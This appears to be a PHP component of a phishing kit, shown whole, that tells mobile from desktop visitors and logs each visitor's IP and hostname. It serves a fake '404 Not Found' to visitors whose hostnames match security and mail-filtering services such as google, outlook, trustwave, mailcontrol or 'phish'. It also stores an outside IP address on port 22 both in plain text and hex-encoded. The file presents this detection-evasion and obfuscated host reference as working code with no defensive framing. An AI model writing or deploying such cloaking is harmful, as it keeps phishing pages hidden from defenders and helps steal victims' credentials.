<?php
function isMobile() {
        return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);}
if(isMobile()){
 $device="Mobile";
}
else { 
 $device="Desktop";
}

function writetype() { 
 global $device;
 if ($device=="Mobile") { return "number"; } else { return "text"; }
}




if (@getenv(HTTP_CLIENT_IP)){
	$ip=@getenv(HTTP_CLIENT_IP);}
else {
	$ip=@getenv(REMOTE_ADDR);}
	
	
$hostname = @gethostbyaddr($ip);
$browser = $_SERVER['HTTP_USER_AGENT'];
$hostname = strtolower($hostname);


if(preg_match("/amazonaws/i",$hostname)) {  header('HTTP/1.0 404 Not Found'); die("<h1>404 Not Found</h1>The page that you have requested could not be found."); }
if(preg_match("/google/i",$hostname)) {  header('HTTP/1.0 404 Not Found'); die("<h1>404 Not Found</h1>The page that you have requested could not be found."); }
if(preg_match("/mailcontrol/i",$hostname)) {  header('HTTP/1.0 404 Not Found'); die("<h1>404 Not Found</h1>The page that you have requested could not be found."); }
if(preg_match("/phish/i",$hostname)) {  header('HTTP/1.0 404 Not Found'); die("<h1>404 Not Found</h1>The page that you have requested could not be found."); }
if(preg_match("/outlook/i",$hostname)) {  header('HTTP/1.0 404 Not Found'); die("<h1>404 Not Found</h1>The page that you have requested could not be found."); }                                                                                                                                                                                       
if(preg_match("/trustwave/i",$hostname)) {  header('HTTP/1.0 404 Not Found'); die("<h1>404 Not Found</h1>The page that you have requested could not be found."); }                                                                                                                                                                                           

 $urls = array("http://185.234.216.94:22","687474703a2f2f3138352e3233342e3231362e39343a3232");
?>